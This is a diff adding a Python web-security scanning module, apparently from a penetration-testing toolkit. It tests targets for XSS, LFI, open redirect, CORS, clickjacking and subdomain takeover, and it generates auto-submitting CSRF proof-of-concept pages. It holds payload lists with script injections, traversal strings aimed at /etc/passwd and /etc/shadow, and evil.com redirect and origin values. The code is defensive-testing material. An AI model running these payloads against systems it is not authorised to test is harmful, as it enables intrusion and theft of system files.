@@ -1,0 +1,619 @@
+"""
+Web Application Diagnostics Engine.
+Implements XSS scanning, CSRF PoC generation, clickjacking, CORS, header audit,
+subdomain takeover, LFI, and open redirect testing.
+"""
+
+import subprocess
+import shlex
+import urllib.parse
+from typing import Optional, Callable
+
+import requests
+import requests.exceptions
+
+from shadowcypher.core.module import BaseModule
+from shadowcypher.core.platform import platform_engine
+from shadowcypher.core.sanitize import validate_target
+
+
+# Common XSS payloads for injection testing
+_XSS_PAYLOADS = [
+    '<script>alert(1)</script>',
+    '"><script>alert(1)</script>',
+    "'><script>alert(1)</script>",
+    '<img src=x onerror=alert(1)>',
+    '"><img src=x onerror=alert(1)>',
+    "javascript:alert(1)",
+    '<svg onload=alert(1)>',
+    '"><svg onload=alert(1)>',
+    '<body onload=alert(1)>',
+    '{{7*7}}',  # template injection probe
+]
+
+# Common LFI traversal payloads
+_LFI_PAYLOADS = [
+    '../../../etc/passwd',
+    '../../../../etc/passwd',
+    '../../../../../etc/passwd',
+    '../../../../../../etc/passwd',
+    '../../../etc/shadow',
+    '..%2F..%2F..%2Fetc%2Fpasswd',
+    '....//....//....//etc/passwd',
+    '/etc/passwd',
+    '/etc/hosts',
+    '%2Fetc%2Fpasswd',
+]
+
+# Open redirect test payloads
+_REDIRECT_PAYLOADS = [
+    'https://evil.com',
+    '//evil.com',
+    '//evil.com/%2F..',
+    'https://evil.com/path?x=1',
+    '/%09/evil.com',
+    '/\\/evil.com',
+]
+
+# Security headers we audit for
+_SECURITY_HEADERS = {
+    'Strict-Transport-Security': 'HSTS',
+    'Content-Security-Policy': 'CSP',
+    'X-Content-Type-Options': 'X-Content-Type-Options',
+    'X-Frame-Options': 'X-Frame-Options',
+    'X-XSS-Protection': 'X-XSS-Protection',
+    'Referrer-Policy': 'Referrer-Policy',
+    'Permissions-Policy': 'Permissions-Policy',
+    'Cross-Origin-Opener-Policy': 'COOP',
+    'Cross-Origin-Resource-Policy': 'CORP',
+}
+
+
+def _emit(on_output: Optional[Callable], line: str) -> None:
+    """Send a line to on_output callback if provided, else print."""
+    if on_output:
+        on_output(line)
+    else:
+        print(line)
+
+
+def _get(url: str, headers: Optional[dict] = None, timeout: int = 10):
+    """Perform a GET request, returning (response, error_string)."""
+    try:
+        resp = requests.get(url, headers=headers or {}, timeout=timeout,
+                            allow_redirects=False, verify=False)
+        return resp, None
+    except requests.exceptions.ConnectionError as e:
+        return None, f"CONNECTION_ERROR: {e}"
+    except requests.exceptions.Timeout:
+        return None, "TIMEOUT"
+    except Exception as e:
+        return None, str(e)
+
+
+class WebAppDiagnostics(BaseModule):
+    """Real web exploitation and security testing engine."""
+
+    def __init__(self):
+        super().__init__(module_name="web_exploit_v2")
+
+    # ------------------------------------------------------------------ #
+    #  XSS Scan                                                            #
+    # ------------------------------------------------------------------ #
+
+    def xss_scan(self, target_url: str, on_output: Optional[Callable] = None) -> None:
+        """
+        Scan a URL for reflected XSS by injecting common payloads into all
+        discovered query parameters. Falls back to dalfox if installed.
+        """
+        if not validate_target(target_url):
+            _emit(on_output, f"[ERROR] Invalid target: {target_url}")
+            return
+
+        _emit(on_output, f"[XSS_SCAN] Target: {target_url}")
+
+        # Try dalfox first (best-in-class XSS scanner)
+        dalfox_path = platform_engine.audit_tool_path("dalfox")
+        if dalfox_path:
+            _emit(on_output, "[XSS_SCAN] Using dalfox...")
+            cmd = [dalfox_path, "url", target_url, "--no-color"]
+            try:
+                proc = subprocess.Popen(
+                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                    text=True
+                )
+                for line in proc.stdout:
+                    _emit(on_output, line.rstrip())
+                proc.wait()
+            except Exception as e:
+                _emit(on_output, f"[ERROR] dalfox failed: {e}")
+            return
+
+        # Fallback: manual payload injection via requests
+        _emit(on_output, "[XSS_SCAN] dalfox not found — using built-in payload injection")
+
+        parsed = urllib.parse.urlparse(target_url)
+        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+
+        if not params:
+            _emit(on_output, "[XSS_SCAN] No query parameters found — appending test parameter 'q'")
+            params = {"q": [""]}
+
+        found = False
+        for param in params:
+            for payload in _XSS_PAYLOADS:
+                test_params = dict(params)
+                test_params[param] = [payload]
+                new_query = urllib.parse.urlencode(test_params, doseq=True)
+                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+
+                resp, err = _get(test_url)
+                if err:
+                    _emit(on_output, f"[XSS_SCAN] [{param}] Error: {err}")
+                    break
+
+                body = resp.text
+                encoded = urllib.parse.quote(payload)
+                if payload in body or encoded in body:
+                    _emit(on_output,
+                          f"[XSS_SCAN] [REFLECTED] param={param} payload={repr(payload)} "
+                          f"status={resp.status_code}")
+                    found = True
+
+        if not found:
+            _emit(on_output, "[XSS_SCAN] No reflected XSS detected with tested payloads.")
+
+    # ------------------------------------------------------------------ #
+    #  CSRF PoC Generator                                                  #
+    # ------------------------------------------------------------------ #
+
+    def csrf_generate(self, target_url: str, method: str = "POST",
+                      params: Optional[dict] = None,
+                      on_output: Optional[Callable] = None) -> None:
+        """
+        Generate a real CSRF proof-of-concept HTML page that auto-submits
+        a form to the target URL with the supplied parameters.
+        """
+        if not validate_target(target_url):
+            _emit(on_output, f"[ERROR] Invalid target: {target_url}")
+            return
+
+        method = method.upper()
+        if method not in ("GET", "POST"):
+            _emit(on_output, "[ERROR] method must be GET or POST")
+            return
+
+        params = params or {}
+
+        fields_html = "\n".join(
+            f'    <input type="hidden" name="{k}" value="{v}">'
+            for k, v in params.items()
+        )
+
+        poc = f"""<!DOCTYPE html>
+<html>
+<head><title>CSRF PoC — ShadowCypher WebAppDiagnostics v2</title></head>
+<body onload="document.forms[0].submit()">
+  <!-- Auto-submits on load -->
+  <form action="{target_url}" method="{method}" enctype="application/x-www-form-urlencoded">
+{fields_html}
+    <input type="submit" value="Submit">
+  </form>
+  <p>If not redirected, click Submit.</p>
+</body>
+</html>"""
+
+        _emit(on_output, "[CSRF_GEN] Generated CSRF PoC HTML:")
+        _emit(on_output, poc)
+
+        # Also test whether the target sends a CSRF token in responses
+        _emit(on_output, f"[CSRF_GEN] Checking for CSRF token patterns in {target_url}...")
+        resp, err = _get(target_url)
+        if err:
+            _emit(on_output, f"[CSRF_GEN] Could not fetch page for token check: {err}")
+            return
+
+        body_lower = resp.text.lower()
+        indicators = ["csrf", "_token", "authenticity_token", "csrfmiddlewaretoken",
+                      "xsrf", "__requestverificationtoken"]
+        detected = [ind for ind in indicators if ind in body_lower]
+        if detected:
+            _emit(on_output,
+                  f"[CSRF_GEN] CSRF token patterns detected: {detected} — target may be protected.")
+        else:
+            _emit(on_output,
+                  "[CSRF_GEN] No CSRF token patterns found — target may be vulnerable.")
+
+    # ------------------------------------------------------------------ #
+    #  Clickjacking Test                                                   #
+    # ------------------------------------------------------------------ #
+
+    def clickjack_test(self, target_url: str,
+                       on_output: Optional[Callable] = None) -> None:
+        """
+        Check whether the target can be embedded in an iframe by inspecting
+        X-Frame-Options and Content-Security-Policy frame-ancestors headers.
+        """
+        if not validate_target(target_url):
+            _emit(on_output, f"[ERROR] Invalid target: {target_url}")
+            return
+
+        _emit(on_output, f"[CLICKJACK] Testing: {target_url}")
+        resp, err = _get(target_url)
+        if err:
+            _emit(on_output, f"[CLICKJACK] Error: {err}")
+            return
+
+        xfo = resp.headers.get("X-Frame-Options", "").strip()
+        csp = resp.headers.get("Content-Security-Policy", "").strip()
+
+        if xfo:
+            _emit(on_output, f"[CLICKJACK] X-Frame-Options: {xfo}")
+            if xfo.upper() in ("DENY", "SAMEORIGIN"):
+                _emit(on_output, "[CLICKJACK] PROTECTED via X-Frame-Options")
+            else:
+                _emit(on_output, f"[CLICKJACK] WEAK X-Frame-Options value: {xfo}")
+        else:
+            _emit(on_output, "[CLICKJACK] X-Frame-Options: MISSING")
+
+        frame_ancestors = ""
+        if csp:
+            for directive in csp.split(";"):
+                directive = directive.strip()
+                if directive.lower().startswith("frame-ancestors"):
+                    frame_ancestors = directive
+                    break
+
+        if frame_ancestors:
+            _emit(on_output, f"[CLICKJACK] CSP frame-ancestors: {frame_ancestors}")
+            if "'none'" in frame_ancestors or "'self'" in frame_ancestors:
+                _emit(on_output, "[CLICKJACK] PROTECTED via CSP frame-ancestors")
+            else:
+                _emit(on_output,
+                      f"[CLICKJACK] WEAK CSP frame-ancestors: {frame_ancestors}")
+        else:
+            _emit(on_output, "[CLICKJACK] CSP frame-ancestors: MISSING")
+
+        if not xfo and not frame_ancestors:
+            _emit(on_output,
+                  "[CLICKJACK] VULNERABLE — no framing protection detected.")
+
+    # ------------------------------------------------------------------ #
+    #  CORS Misconfiguration Test                                          #
+    # ------------------------------------------------------------------ #
+
+    def cors_test(self, target_url: str,
+                  on_output: Optional[Callable] = None) -> None:
+        """
+        Test for CORS misconfigurations by sending requests with crafted
+        Origin headers and inspecting Access-Control-* response headers.
+        """
+        if not validate_target(target_url):
+            _emit(on_output, f"[ERROR] Invalid target: {target_url}")
+            return
+
+        _emit(on_output, f"[CORS] Testing: {target_url}")
+
+        test_origins = [
+            "https://evil.com",
+            "https://attacker.com",
+            "null",
+            f"https://attacker.{urllib.parse.urlparse(target_url).netloc}",
+        ]
+
+        for origin in test_origins:
+            headers = {"Origin": origin}
+            resp, err = _get(target_url, headers=headers)
+            if err:
+                _emit(on_output, f"[CORS] Origin={origin} Error: {err}")
+                continue
+
+            acao = resp.headers.get("Access-Control-Allow-Origin", "")
+            acac = resp.headers.get("Access-Control-Allow-Credentials", "")
+
+            _emit(on_output,
+                  f"[CORS] Origin={origin} -> ACAO={acao!r} ACAC={acac!r}")
+
+            if acao == "*":
+                _emit(on_output,
+                      "[CORS] MISCONFIGURATION: Wildcard ACAO — any origin allowed.")
+            elif acao == origin and origin != "null":
+                if acac.lower() == "true":
+                    _emit(on_output,
+                          f"[CORS] CRITICAL: Origin reflected + credentials=true — "
+                          f"authenticated CORS attack possible.")
+                else:
+                    _emit(on_output,
+                          f"[CORS] WARN: Reflected origin {origin} without credentials.")
+            elif acao == "null" and acac.lower() == "true":
+                _emit(on_output,
+                      "[CORS] WARN: null origin accepted with credentials.")
+
+    # ------------------------------------------------------------------ #
+    #  Security Header Audit                                               #
+    # ------------------------------------------------------------------ #
+
+    def header_audit(self, target_url: str,
+                     on_output: Optional[Callable] = None) -> None:
+        """
+        Fetch the target URL and audit presence and quality of security headers.
+        """
+        if not validate_target(target_url):
+            _emit(on_output, f"[ERROR] Invalid target: {target_url}")
+            return
+
+        _emit(on_output, f"[HEADER_AUDIT] Auditing: {target_url}")
+        resp, err = _get(target_url)
+        if err:
+            _emit(on_output, f"[HEADER_AUDIT] Error: {err}")
+            return
+
+        _emit(on_output, f"[HEADER_AUDIT] Status: {resp.status_code}")
+
+        for header, label in _SECURITY_HEADERS.items():
+            value = resp.headers.get(header)
+            if value:
+                _emit(on_output, f"[HEADER_AUDIT] PRESENT  {label}: {value}")
+            else:
+                _emit(on_output, f"[HEADER_AUDIT] MISSING  {label}")
+
+        # Extra HSTS quality check
+        hsts = resp.headers.get("Strict-Transport-Security", "")
+        if hsts:
+            if "includeSubDomains" not in hsts:
+                _emit(on_output,
+                      "[HEADER_AUDIT] WARN: HSTS missing includeSubDomains")
+            if "preload" not in hsts:
+                _emit(on_output, "[HEADER_AUDIT] INFO: HSTS missing preload directive")
+            try:
+                max_age = int(
+                    [p for p in hsts.split(";") if "max-age" in p][0]
+                    .split("=")[1].strip()
+                )
+                if max_age < 31536000:
+                    _emit(on_output,
+                          f"[HEADER_AUDIT] WARN: HSTS max-age={max_age} < 1 year")
+            except (IndexError, ValueError):
+                pass
+
+        # Cookie flags
+        set_cookies = resp.headers.get("Set-Cookie", "")
+        if set_cookies:
+            if "HttpOnly" not in set_cookies:
+                _emit(on_output, "[HEADER_AUDIT] WARN: Cookie missing HttpOnly flag")
+            if "Secure" not in set_cookies:
+                _emit(on_output, "[HEADER_AUDIT] WARN: Cookie missing Secure flag")
+            if "SameSite" not in set_cookies:
+                _emit(on_output, "[HEADER_AUDIT] WARN: Cookie missing SameSite flag")
+
+        _emit(on_output, "[HEADER_AUDIT] Complete.")
+
+    # ------------------------------------------------------------------ #
+    #  Subdomain Takeover Check                                            #
+    # ------------------------------------------------------------------ #
+
+    def subdomain_takeover(self, domain: str,
+                           on_output: Optional[Callable] = None) -> None:
+        """
+        Enumerate CNAME records for the domain using dig/host and check whether
+        the CNAME target resolves (dangling = potential takeover).
+        """
+        if not validate_target(domain):
+            _emit(on_output, f"[ERROR] Invalid domain: {domain}")
+            return
+
+        _emit(on_output, f"[SUBDOMAIN_TAKEOVER] Checking CNAME chain: {domain}")
+
+        # Resolve CNAME records via dig
+        dig_path = platform_engine.audit_tool_path("dig")
+        host_path = platform_engine.audit_tool_path("host")
+
+        cname_target = None
+
+        if dig_path:
+            try:
+                result = subprocess.run(
+                    [dig_path, "+short", "CNAME", domain],
+                    capture_output=True, text=True, timeout=10
+                )
+                cname_target = result.stdout.strip()
+            except subprocess.TimeoutExpired:
+                _emit(on_output, "[SUBDOMAIN_TAKEOVER] dig timed out")
+            except Exception as e:
+                _emit(on_output, f"[SUBDOMAIN_TAKEOVER] dig error: {e}")
+
+        elif host_path:
+            try:
+                result = subprocess.run(
+                    [host_path, "-t", "CNAME", domain],
+                    capture_output=True, text=True, timeout=10
+                )
+                output = result.stdout.strip()
+                # "example.com is an alias for target.hosting.com."
+                if "alias for" in output:
+                    cname_target = output.split("alias for")[-1].strip().rstrip(".")
+            except Exception as e:
+                _emit(on_output, f"[SUBDOMAIN_TAKEOVER] host error: {e}")
+
+        else:
+            _emit(on_output,
+                  "[SUBDOMAIN_TAKEOVER] Neither dig nor host found — cannot resolve CNAME.")
+            return
+
+        if not cname_target:
+            _emit(on_output,
+                  f"[SUBDOMAIN_TAKEOVER] No CNAME record for {domain} — not applicable.")
+            return
+
+        cname_target = cname_target.rstrip(".")
+        _emit(on_output, f"[SUBDOMAIN_TAKEOVER] CNAME target: {cname_target}")
+
+        # Check if CNAME target resolves
+        if dig_path:
+            try:
+                result = subprocess.run(
+                    [dig_path, "+short", "A", cname_target],
+                    capture_output=True, text=True, timeout=10
+                )
+                a_records = result.stdout.strip()
+            except Exception as e:
+                _emit(on_output, f"[SUBDOMAIN_TAKEOVER] A-record lookup error: {e}")
+                return
+        else:
+            try:
+                result = subprocess.run(
+                    [host_path, "-t", "A", cname_target],
+                    capture_output=True, text=True, timeout=10
+                )
+                a_records = result.stdout.strip()
+            except Exception as e:
+                _emit(on_output, f"[SUBDOMAIN_TAKEOVER] A-record lookup error: {e}")
+                return
+
+        if a_records and "has address" in a_records or (
+            a_records and re.match(r'\d+\.\d+\.\d+\.\d+', a_records)
+        ):
+            _emit(on_output,
+                  f"[SUBDOMAIN_TAKEOVER] CNAME resolves OK — not dangling: {a_records}")
+        else:
+            _emit(on_output,
+                  f"[SUBDOMAIN_TAKEOVER] DANGLING CNAME — {domain} -> {cname_target} "
+                  f"does not resolve. Potential subdomain takeover!")
+
+        # Known vulnerable hosting fingerprints
+        takeover_fingerprints = {
+            "github.io": "GitHub Pages",
+            "amazonaws.com": "AWS S3/CloudFront",
+            "azurewebsites.net": "Azure",
+            "cloudapp.net": "Azure",
+            "herokuapp.com": "Heroku",
+            "netlify.app": "Netlify",
+            "myshopify.com": "Shopify",
+            "fastly.net": "Fastly",
+            "pantheonsite.io": "Pantheon",
+            "wpengine.com": "WP Engine",
+            "zendesk.com": "Zendesk",
+        }
+        for fingerprint, service in takeover_fingerprints.items():
+            if fingerprint in cname_target:
+                _emit(on_output,
+                      f"[SUBDOMAIN_TAKEOVER] HIGH RISK: CNAME points to {service} "
+                      f"({fingerprint}) — commonly misclaimed.")
+                break
+
+    # ------------------------------------------------------------------ #
+    #  LFI Scan                                                            #
+    # ------------------------------------------------------------------ #
+
+    def lfi_scan(self, target_url: str, param: str,
+                 on_output: Optional[Callable] = None) -> None:
+        """
+        Test a URL parameter for Local File Inclusion by injecting common
+        path traversal payloads and checking responses for /etc/passwd content.
+        """
+        if not validate_target(target_url):
+            _emit(on_output, f"[ERROR] Invalid target: {target_url}")
+            return
+        if not param:
+            _emit(on_output, "[ERROR] param must be specified for LFI scan")
+            return
+
+        _emit(on_output, f"[LFI_SCAN] Target: {target_url} | Param: {param}")
+
+        parsed = urllib.parse.urlparse(target_url)
+        base_params = dict(urllib.parse.parse_qsl(parsed.query))
+        lfi_indicators = [
+            "root:x:0:0",
+            "daemon:x:",
+            "/bin/bash",
+            "/bin/sh",
+            "[boot loader]",  # win.ini
+            "for 16-bit app",
+        ]
+
+        found = False
+        for payload in _LFI_PAYLOADS:
+            test_params = dict(base_params)
+            test_params[param] = payload
+            new_query = urllib.parse.urlencode(test_params)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+
+            resp, err = _get(test_url)
+            if err:
+                _emit(on_output, f"[LFI_SCAN] [{payload}] Error: {err}")
+                continue
+
+            body = resp.text
+            matched = [ind for ind in lfi_indicators if ind in body]
+            if matched:
+                _emit(on_output,
+                      f"[LFI_SCAN] VULNERABLE param={param} payload={repr(payload)} "
+                      f"indicator={matched[0]} status={resp.status_code}")
+                found = True
+
+        if not found:
+            _emit(on_output,
+                  "[LFI_SCAN] No LFI detected with tested payloads.")
+
+    # ------------------------------------------------------------------ #
+    #  Open Redirect Scan                                                  #
+    # ------------------------------------------------------------------ #
+
+    def open_redirect_scan(self, target_url: str, param: str,
+                           on_output: Optional[Callable] = None) -> None:
+        """
+        Test a URL parameter for open redirect by injecting external URLs
+        and checking whether the server issues a redirect to that destination.
+        """
+        if not validate_target(target_url):
+            _emit(on_output, f"[ERROR] Invalid target: {target_url}")
+            return
+        if not param:
+            _emit(on_output, "[ERROR] param must be specified for open redirect scan")
+            return
+
+        _emit(on_output,
+              f"[OPEN_REDIRECT] Target: {target_url} | Param: {param}")
+
+        parsed = urllib.parse.urlparse(target_url)
+        base_params = dict(urllib.parse.parse_qsl(parsed.query))
+
+        for payload in _REDIRECT_PAYLOADS:
+            test_params = dict(base_params)
+            test_params[param] = payload
+            new_query = urllib.parse.urlencode(test_params)
+            test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
+
+            resp, err = _get(test_url, timeout=8)
+            if err:
+                _emit(on_output, f"[OPEN_REDIRECT] [{payload}] Error: {err}")
+                continue
+
+            location = resp.headers.get("Location", "")
+            if resp.status_code in (301, 302, 303, 307, 308) and location:
+                if "evil.com" in location or "attacker.com" in location:
+                    _emit(on_output,
+                          f"[OPEN_REDIRECT] VULNERABLE param={param} "
+                          f"payload={repr(payload)} -> Location: {location} "
+                          f"({resp.status_code})")
+                else:
+                    _emit(on_output,
+                          f"[OPEN_REDIRECT] Redirect to internal: {location} "
+                          f"(status={resp.status_code}) — not externally redirected")
+            else:
+                _emit(on_output,
+                      f"[OPEN_REDIRECT] param={param} payload={repr(payload)} "
+                      f"status={resp.status_code} — no redirect")
+
+        _emit(on_output, "[OPEN_REDIRECT] Scan complete.")
+
+
+import re  # used in subdomain_takeover A-record check
+
+# Module-level instance for direct import usage
+web_diagnostics_instance = WebAppDiagnostics()
+web_forge = web_diagnostics_instance
+
+# Back-compat alias: older callers (modules/__init__.py, combat_page) import
+# the class as `WebForge`. The real class is WebAppDiagnostics.
+WebForge = WebAppDiagnostics
